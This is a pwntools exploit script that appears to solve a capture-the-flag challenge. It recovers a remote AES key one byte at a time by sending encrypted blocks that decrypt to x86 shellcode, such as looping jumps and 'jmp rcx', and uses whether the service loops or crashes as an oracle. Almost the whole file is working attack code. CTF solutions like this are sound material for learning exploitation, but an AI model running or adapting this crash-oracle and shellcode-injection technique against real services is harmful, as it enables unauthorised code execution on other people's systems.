from pwn import *
from aes import AES
from tqdm import tqdm

BINARY = "./main"
HOST = "shortyer-vegan.ctf"
PORT = 1337

elf = context.binary = ELF(BINARY, checksec=False)

context.log_level = "WARNING"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P', '-p', '70']
context.gdbinit = "~/.gdbinit_splitmind"
env = {} # {"LD_LIBRARY_PATH": "./", "LD_PRELOAD": ""}
gdbscript = '''
'''

def start():
    if args.REMOTE:
        return connect(HOST, PORT)
    elif args.RAW:
        return process(BINARY, env=env)
    else:
        return gdb.debug(BINARY, gdbscript=gdbscript, env=env)

def try_payload(payload):
    """ Test input for infinite loop """

    conn = start()

    conn.send(payload)  # Send payload to be encrypted
    conn.send(b"\x00" * 16)  # Terminate loop by null bytes
    res = False

    try:
        # If program hasn't crashed, we have a loop

        conn.recv(timeout=0.05)
        res = True
    except:
        # If the program has crashed, we get an exception

        pass

    conn.close()
    return res

def get_first(loop_bytes):
    """ Finds the first byte of the remote key from looping inputsd """

    # Isolate payloads with unique first bytes. This takes 51c2 into account
    singles = [c for c in loop_bytes if loop_bytes.count(c) in {1, 2}]
    singles = list(set(singles))

    # Isolate remaining relative jumps
    multiples = list(set(c for c in loop_bytes if c not in singles))

    # Must be only two payloads with unique first bytes
    assert len(singles) == 2

    # Generate two possible key bytes
    k_pos1 = singles[0] ^ valid_singles[0]
    k_pos2 = singles[0] ^ valid_singles[1]

    # Check whether which possible key byte matches with remaining loops
    if all(c ^ k_pos1 in valid_multiples for c in multiples):
        k_byte1 = k_pos1

    elif all(c ^ k_pos2 in valid_multiples for c in multiples):
        k_byte1 = k_pos2

    else:
        raise ValueError("Valid key-byte not found")

    return k_byte1


# First byte of looping shellcodes
valid_singles = [0x51, 0xff]
valid_multiples = [0xe2, 0xeb, 0x76, 0xe1, 0x79, 0x7e, 0xe9, 0x71, 0x74, 0x73, 0x7d, 0x7a]

# Importing from aes.py
c = AES()
loop_bytes = []

# Get a progress bar going
for i in tqdm(range(256)):
    for j in range(256):

        # Random local key
        key = bytes((i, j)) + b"\x00" * 14

        # Executed code on remote is equal to local key ^ remote key
        payload = c.AESENCINV(b"\x00" * 16, key)

        if try_payload(payload):

            # The payload caused a loop, save the first byte
            loop_bytes.append(i)

# Get the first byte
key = bytearray(16)
key[0] = get_first(loop_bytes)
crib = asm("jmp rcx;")  # Target ciphertext

for i in tqdm(range(1, 16)):
    for j in range(256):
        # Use new byte as key guess
        key[i] = j

        # Pad crib with NOPs
        payload = b"\x90" * (i - 1) + crib

        # Pad payload with null bytes
        payload = payload.ljust(16, b"\x00")

        # Encrypt using key-guess
        payload = c.AESENCINV(payload, key)

        if try_payload(payload):
            break

    else:
        raise ValueError("Did not find key-byte")

print(key)
